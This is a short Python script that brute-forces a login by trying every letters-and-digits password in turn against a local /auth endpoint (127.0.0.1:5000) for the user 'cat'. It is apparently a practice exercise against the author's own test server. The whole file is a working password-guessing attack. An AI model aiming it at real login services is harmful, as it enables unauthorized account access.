import requests
k = 0  # password length
counter = 0

alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
base = len(alphabet)

while True:
    password = ''  # password

    # generator code
    i = counter
    while i > 0:
        reminder = i % base
        password = alphabet[reminder] + password
        i = i // base

    password = alphabet[0] * (k - len(password)) + password

    print(counter, password)  # test generated code
    response = requests.post('http://127.0.0.1:5000/auth',
                             json={'login': 'cat', 'password': password})
    if response.status_code == 200:
        print('SUCCESS, password', password)
        break
    counter += 1
    if password == alphabet[-1] * k:  # max_password_for_given_length
        k += 1
        counter = 0
